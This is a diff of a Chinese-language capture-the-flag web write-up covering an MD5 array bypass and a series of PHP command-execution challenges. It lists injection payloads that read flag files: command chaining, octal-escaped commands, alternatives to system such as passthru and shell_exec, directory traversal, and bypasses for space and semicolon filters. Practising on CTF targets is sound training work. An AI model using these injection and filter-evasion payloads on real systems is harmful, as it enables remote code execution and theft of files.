@@ -1,3 +1,4 @@
+# MD5  数组绕过
 **EZMD5**
 ![image copy 52.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272405384_image_copy_52.png)
 
@@ -84,6 +85,10 @@ ab不等，但哈希值相同
 ![image copy 59.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272408674_image_copy_59.png)
 PSOT:cmd=nl /flag
 
+
+
+
+# 命令执行
 **EZCMD_1**
 ![image copy 60.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272411140_image_copy_60.png)
 PSOT:cmd=127.0.0.1;ls     查目录
@@ -131,8 +136,10 @@ ag
 
 **EZCMD_5**
 ![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781424039478_image.png)
+
+没有**过滤数字**的无字母 RCE，使用 ANSI-C 风格的转义，格式为 **$'.....'** ，省略号中用八进制
+
 [ANSI-C在线编码](https://xobear.cn/CTF/Web/PHP/ansi-c-encode.html)注意编码后的是16进制，还需要转为八进制
-没有过滤数字的无字母 RCE，使用 ANSI-C 风格的转义，格式为 ** $'...' ** ，省略号中用八进制
 `cmd=$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'`
 ![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781426578446_image.png)
 
@@ -146,6 +153,58 @@ ag
 ../../../有flag
 pyload=`?qc=system('cat ../../../fla?');` 
 `fla?` ? 是占位符
+**EZCMD_8**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781496069039_image.png)
+system只是php的一种命令执行函数，还有很多其他的。
+| 替代函数 | 用法示例 |
+|-----------|----------|
+| `passthru` | `passthru('ls');` |
+| `exec` | `exec('ls',$a);print_r($a);` |
+| `shell_exec` | `echo shell_exec('ls');` |
+| 反引号 | `` echo `ls`; `` |
+| `popen` | `$f=popen('ls','r');echo fread($f,4096);` |
+
+可以一步到位 `?qc=passthru('cat /f*');` 到此为止。
+
+
+`?qc=echo __FILE__;` **当前文件路径**
+目录遍历
+`?qc=print_r(scandir('../../../'));` **发现在../../../目录下有flag**
+`?qc=echo shell_exec('cat ../../../f*');`
+`?qc=passthru('cat ../../../f*');`
+
+**`/f*` 和 `../../../f*` 效果一样，因为 `../../../` 恰好回到了根目录**
+
+**EZCMD_9**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781496824928_image.png)
+这一题过滤了空格。用`%09` `%0a` `${IFS}` `chr(32)`绕过过空格
+`?qc=passthru('cat%09/f*');`
+`?qc=passthru('cat'.chr(32).'/f*');`
+
+**EZCMD_10**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781497610322_image.png)
+只过了滤分号。
+
+**PHP 官方文档明确说明：`?>` 结尾标签会自动隐含一个分号。**
+也可以使用花括号`if(1){}`来绕过过滤。
+例如`?qc=if(1){passthru('cat /flag.txt')}`
+
+`?qc=passthru('cat /flag.txt')?>`
+
+**EZCMD_11**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781498099974_image.png)
+`?qc=passthru('cat flag.php')?>`与上一题没什么区别
+
+`?qc=echo file_get_contents('flag.php')%3F%3E`  ctrl+U看源码有flag
+`?qc=passthru('tac${IFS}$9fla*')?>`
+
+**EZCMD_12**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781499728494_image.png)
+
+
+
+
+
 
 
 
